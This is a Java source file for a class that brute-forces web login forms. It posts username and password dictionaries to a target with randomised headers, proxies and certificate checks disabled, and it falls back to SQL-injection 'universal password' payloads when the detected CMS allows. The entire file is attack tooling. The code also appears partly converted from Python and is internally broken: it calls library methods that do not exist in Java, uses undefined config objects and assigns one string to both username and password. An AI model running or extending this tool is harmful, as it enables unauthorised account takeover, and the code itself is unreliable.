import java.util.*;
import java.io.*;
import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
public class CrackTask {
 private int id;
 private String url;
 private Parser parser;
 private int error_length;
 private Map<String, Object> requests_proxies;
 private int timeout;
 private List<String> fail_words;
 private String test_username;
 private String test_password;
 private Connection conn;
 public CrackTask() {
 requests_proxies = crackConfig.getMap("requests_proxies");
 timeout = crackConfig.getInt("timeout");
 fail_words = crackConfig.getList("fail_words");
 test_username = crackConfig.getString("test_username");
 test_password = crackConfig.getString("test_password");
 }
 public void run(int id, String url) {
 this.id = id;
 this.url = url;
 System.out.println("");
 Log.init_log_id(id);
 Log.Info("[*] Start: " + url);
 try {
 parser = new Parser(url);
 if (!parser.run()) {
 return;
 }
 error_length = get_error_length();
 Map<List<String>, List<String>> dictMap = gen_dict(url);
 List<String> username_list = dictMap.keySet().iterator().next();
 List<String> password_list = dictMap.values().iterator().next();
 String username, password;
 if (!username_list.isEmpty() && !password_list.isEmpty()) {
 username = password = crack_task(username_list, password_list);
 } else {
 if (parser.getCms() != null) {
 boolean sqlin_dict_enable = parser.getCms().isSqlin_able();
 if (sqlin_dict_enable) {
 Log.Info("[*] " + url + " 启动万能密码爆破模块");
 Map<List<String>, List<String>> sqlinDictMap = gen_sqlin_dict();
 username_list = sqlinDictMap.keySet().iterator().next();
 password_list = sqlinDictMap.values().iterator().next();
 username = password = crack_task(username_list, password_list);
 }
 }
 }
 if (username != null && password != null) {
 Log.Info("[*] Rechecking... " + url + " " + username + " " + password);
 boolean recheck_flag = recheck(username, password);
 if (recheck_flag) {
 Log.Success("[+] Success: " + url + " " + username + "/" + password);
 return;
 } else {
 Log.Info("[-] Recheck failed: " + url + " " + username + "/" + password);
 }
 }
 } catch (Exception e) {
 Log.Error(e.toString());
 }
 Log.Error("[-] Failed: " + url);
 }
 public Response crack_request(Connection conn, String username, String password) throws IOException {
 Map<String, String> data = parser.getData();
 String path = parser.getPost_path();
 data.put(parser.getUsername_keyword(), username);
 data.put(parser.getPassword_keyword(), password);
 Response res = conn.post(path)
 .data(data)
 .headers(get_random_headers())
 .timeout(timeout)
 .verify(false)
 .followRedirects(true)
 .proxies(requests_proxies)
 .execute();
 Time.sleep(crackConfig.getInt("delay"));
 res.encoding(res.apparent_encoding());
 return res;
 }
 public int get_error_length() throws IOException {
 Connection conn = Jsoup.connect(url).headers(get_random_headers()).ignoreContentType(true).ignoreHttpErrors(true).timeout(timeout);
 this.conn = conn;
 // Response pre_res = crack_request(conn, test_username, test_password); // 预请求一次
 Response res1 = crack_request(conn, test_username, test_password);
 Response res2 = crack_request(conn, test_username, test_password);
 int error_length1 = get_res_length(res1);
 int error_length2 = get_res_length(res2);
 if (error_length1 != error_length2) {
 throw new Exception("[-] " + url + " Error length 不为固定值");
 }
 return error_length1;
 }
 public boolean recheck(String username, String password) throws IOException {
 password = password.replace("{user}", username);
 Connection conn = Jsoup.connect(url).headers(get_random_headers()).ignoreContentType(true).ignoreHttpErrors(true).timeout(timeout);
 // Response pre_res = crack_request(conn, test_username, test_password); // 预请求一次
 Response res1 = crack_request(conn, test_username, test_password);
 Response res2 = crack_request(conn, username, password);
 int error_length1 = get_res_length(res1);
 int error_length2 = get_res_length(res2);
 if (error_length1 == error_length2 || res2.getStatusCode() == 403) {
 return false;
 } else {
 return true;
 }
 }
 public String crack_task(List<String> username_list, List<String> password_list) throws IOException {
 List<String> fail_words = this.fail_words;
 Connection conn = this.conn;
 int error_length = this.error_length;
 int num = 0;
 int dic_all = username_list.size() * password_list.size();
 for (String username : username_list) {
 for (String password : password_list) {
 boolean right_pass = true;
 password = password.replace("{user}", username);
 num++;
 Log.Info("[*] " + url + " 进度: (" + num + "/" + dic_all + ") checking: " + username + " " + password);
 Response res = crack_request(conn, username, password);
 String html = res.body() + res.headers().toString();
 if (parser.getCms() != null) {
 if (parser.getCms().getSuccess_flag() != null && html.contains(parser.getCms().getSuccess_flag())) {
 return username+"/"+password;
 } else if (parser.getCms().getDie_flag() != null && html.contains(parser.getCms().getDie_flag())) {
 return null;
 }
 }
 for (String fail_word : fail_words) {
 if (html.contains(fail_word)) {
 right_pass = false;
 break;
 }
 }
 if (right_pass) {
 int cur_length = get_res_length(res);
 if (html.contains(parser.getUsername_keyword()) && html.contains(parser.getPassword_keyword())) {
 continue;
 }
 if (cur_length != error_length) {
 return username+"/"+password;
 } else {
 continue;
 }
 }
 }
 }
 return null;
 }
}